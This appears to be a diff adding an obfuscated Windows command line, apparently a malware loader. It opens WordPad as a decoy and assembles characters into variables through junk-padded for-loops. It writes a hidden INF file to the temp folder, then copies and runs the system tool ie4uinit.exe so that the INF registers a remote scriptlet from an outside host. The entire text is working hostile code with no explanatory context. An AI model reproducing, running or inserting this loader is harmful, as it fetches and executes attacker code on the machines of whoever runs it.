@@ -1,0 +1,21 @@
+/v /c start "" "%ProgramFiles%\Windows NT\Accessories\wordpad.exe" & (for %v in ("nellaxi=c" "itinerarye=l" "monocha=et" "dishwi=t" "uroede=s" ) do @set %~v) &&
+  (for %p in ("-") do @set "protest=%~p") &&
+  callcallcallcall(for %g in ("s") do @set "molecular=%~g") &&
+  (for %w in ("e") do @set "exrxc=%~w") &&
+  (for %v in ("e") do @set "exrxc=%~v") &&
+  (for %r in ("f") do @set "paeo=%~r") &&
+  callcallcallcallcall(for %f in ("o") do @set "descryi=%~f") &&
+  callcallcall(for %s in ("c") do @set "aghanee=%~s") &&
+  (for %r in ("R") do @set "fibromyxom=%~r") &&
+  (for %f in ("C") do @set "echina=%~f") &&
+  (for %l in ("n") do @set "quirkishe=%~l") &&
+  (for %p in ("7") do @set "sah=%~p") &&
+  (for %d in ("F") do @set "str=%~d") &&
+  callcall(for %w in ("m") do @set "heir=%~w") &&
+  (for %y in (".") do @set "prolet=%~y") &&
+  (for %z in ("i") do @set "hydre=%~z") &&
+  (for %i in ("p") do @set "bia=%~i") &&
+  callcallcall(for %z in ("i") do @set "hydre=%~z") &&
+  call(for %h in ("[strings]" "servicename= 'poliadverr'" "shortsvcname= 'poliadverr'" "buttressl=-" "steamf=." "casementedn=/" "transit=N" "tam=b" "guardia=c" "vangue=e" "rachiti=i" "glo=l" "fadea=n" "dextrorotat=o" "inhum=p" "incorp=t" "dainti=u" "[defaultinstall.windows7]" "delfiles=BA1" "Un\" "Register\" "OCXs=fyc_FF2B" "[version]" "signature=$windows nt$" "[BA1]" "i%vangue%u%rachiti%n%rachiti%t%steamf%i%fadea%f" "[destinationdirs]" "defaultdestdir=11" "BA1=01" "[fyc_FF2B]" "s%guardia%r%dextrorotat%b\" "j%steamf%d%glo%l,%transit%I,h%incorp%t%inhum%:%casementedn%/%guardia%o%fadea%n%vangue%c%incorp%.%inhum%a%dainti%l%buttressl%s%incorp%e%rachiti%n%steamf%c%dextrorotat%m%casementedn%d%tam%u%rachiti%q%dextrorotat%" ) do @echo %~h) > "%temp%\ieuinit.inf" &&
+  call xcopy /Y /C /Q %windir%\system32\ie4uinit.exe "%temp%" &&
+  start " " %temp%\ie4uinit.exe -basesettings
